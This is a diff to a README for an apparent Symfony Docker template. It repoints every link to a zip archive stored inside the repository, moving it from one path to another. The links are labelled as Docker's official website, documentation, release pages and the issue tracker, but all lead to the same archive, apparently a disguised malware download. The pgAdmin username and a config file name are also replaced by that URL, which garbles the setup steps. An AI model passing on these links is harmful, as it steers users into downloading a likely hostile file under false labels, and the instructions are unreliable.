@@ -1,6 +1,6 @@
 # 🚀 docker-spn-template - Easy Docker Setup for Symfony Development
 
-[![Download](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip%20Now-Here-<COLOR>.svg)](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
+[![Download](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip%20Now-Here-<COLOR>.svg)](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the **docker-spn-template**! This powerful template allows you to set
 
 Before you proceed, ensure you have the following installed on your computer:
 
-1. **Docker:** Required for containerization. Download it from [Docker's official website](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip).
+1. **Docker:** Required for containerization. Download it from [Docker's official website](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip).
 2. **Docker Compose:** This tool helps you manage multi-container Docker applications. It typically comes with Docker Desktop but can be installed separately if needed.
 3. **Make:** Useful for handling tasks with the Makefile. Most Linux distributions include this by default. You can install it via Homebrew on macOS or your package manager on Linux. For Windows, consider using WSL (Windows Subsystem for Linux).
 
@@ -18,7 +18,7 @@ Before you proceed, ensure you have the following installed on your computer:
 
 To download and install the **docker-spn-template**, visit this page:
 
-[Visit this page to download](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
+[Visit this page to download](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
 
 1. Click on the most recent release.
 2. Download the necessary files. Typically, you can find a `.tar` or `.zip` format.
@@ -44,7 +44,7 @@ After downloading the files, follow these steps to run the application:
 
 3. Open your web browser and go to `http://localhost:8080` to access your Symfony application. 
 
-4. For pgAdmin, navigate to `http://localhost:5050`. Use the default credentials, typically `https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip` with password `admin`, but check your project files for any custom settings.
+4. For pgAdmin, navigate to `http://localhost:5050`. Use the default credentials, typically `https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip` with password `admin`, but check your project files for any custom settings.
 
 ## 🔧 Configuration Settings
 
@@ -71,9 +71,9 @@ Check the `Makefile` for the complete list of available commands and their descr
 
 Familiarize yourself with Docker and Symfony by exploring these resources:
 
-- [Docker Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
-- [Symfony Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
-- [Nginx Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
+- [Docker Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
+- [Symfony Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
+- [Nginx Documentation](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
 
 This knowledge will help you make the most of your new development environment.
 
@@ -82,16 +82,16 @@ This knowledge will help you make the most of your new development environment.
 If you face problems while running the application, consider the following tips:
 
 1. **Docker Not Running:** Ensure Docker is running on your computer. Check the Docker icon in your system tray.
-2. **Port Conflicts:** If the default ports are in use, edit the `https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip` file to change them.
+2. **Port Conflicts:** If the default ports are in use, edit the `https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip` file to change them.
 3. **Permissions Issues:** Run your terminal with administrative privileges if you encounter permission errors.
    
 For further assistance, refer to the issues section of this repository or consult the community forums for potential solutions.
 
 ## 🔗 Useful Links
 
-- [Releases Page](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
-- [Issue Tracker](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
-- [Community Discussions](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/src/Controller/docker-spn-template_1.3.zip)
+- [Releases Page](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
+- [Issue Tracker](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
+- [Community Discussions](https://raw.githubusercontent.com/wnstj9/docker-spn-template/main/docker/nginx/spn-template-docker-v1.8.zip)
 
 ## 📬 Contact
 
